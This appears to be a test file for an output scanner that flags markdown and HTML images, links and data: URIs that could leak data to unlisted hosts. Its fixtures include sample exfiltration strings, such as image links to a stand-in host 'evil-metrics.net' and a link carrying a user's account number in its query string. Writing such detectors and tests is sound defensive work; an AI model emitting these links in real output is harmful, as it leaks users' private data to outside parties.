import { analyzeOutput } from '../src/output';

const ALLOW = ['ourcompany.com', '*.cdn.ourcompany.com'];

describe('analyzeOutput render allowlist', () => {
  it('is inert when renderAllowlist is not set', () => {
    const r = analyzeOutput('See ![chart](https://evil-metrics.net/c.png?d=abcdefghijklmnopqrstuvwxyz0123456789)');
    expect(r.render).toBeUndefined();
    expect(r.matches.some((m) => m.rule.id.startsWith('out-render'))).toBe(false);
  });

  it('blocks a markdown image to an unlisted host and reports the finding', () => {
    const r = analyzeOutput('Done. ![status](https://evil-metrics.net/pixel.png?u=4411)', { renderAllowlist: ALLOW });
    expect(r.action).toBe('block');
    expect(r.matches.map((m) => m.rule.id)).toContain('out-render-unlisted-host');
    expect(r.render?.[0]).toMatchObject({ host: 'evil-metrics.net', via: 'markdown-image', allowed: false });
  });

  it('allows listed hosts and wildcard subdomains, including plain links', () => {
    const r = analyzeOutput('See [the doc](https://ourcompany.com/docs) and ![logo](https://img.cdn.ourcompany.com/logo.png)', { renderAllowlist: ALLOW });
    expect(r.action).toBe('allow');
    expect(r.render?.every((f) => f.allowed)).toBe(true);
    expect(r.render?.map((f) => f.via).sort()).toEqual(['markdown-image', 'markdown-link']);
  });

  it('flags a high-entropy query value and a conversation-derived value even on a listed host', () => {
    const secret = 'Q7x9Lm2Pz8Vk4Rt6Yw3Bn5Hs1Jd0Fg';
    const r = analyzeOutput(`![p](https://ourcompany.com/t.png?k=${secret})`, { renderAllowlist: ALLOW });
    expect(r.matches.map((m) => m.rule.id)).toContain('out-query-param-high-entropy');
    expect(r.render?.[0]?.suspiciousParams).toEqual([{ name: 'k', reason: 'high-entropy' }]);

    const conversation = 'User: my account number is 4455-7788-9911 and the pin is 2468.';
    const c = analyzeOutput('[receipt](https://ourcompany.com/r?acct=4455-7788-9911)', { renderAllowlist: ALLOW, conversation });
    expect(c.matches.map((m) => m.rule.id)).toContain('out-query-param-conversation');
    expect(c.action).toBe('block');
  });

  it('catches HTML src/href and data: URIs', () => {
    const r = analyzeOutput('<img src="https://evil-metrics.net/i.png"><a href=\'https://ourcompany.com/ok\'>ok</a> <img src="data:image/svg+xml;base64,PHN2Zz4=">', {
      renderAllowlist: ALLOW,
    });
    const ids = r.matches.map((m) => m.rule.id);
    expect(ids).toContain('out-render-unlisted-host');
    expect(ids).toContain('out-data-uri-exfil');
    expect(r.render?.map((f) => f.via).sort()).toEqual(['data-uri', 'html-href', 'html-src']);
  });

  it('ignores relative and non-http URLs', () => {
    const r = analyzeOutput('[a](/relative/path) [b](mailto:x@y.io) ![c](./local.png)', { renderAllowlist: ALLOW });
    expect(r.render).toEqual([]);
    expect(r.action).toBe('allow');
  });
});
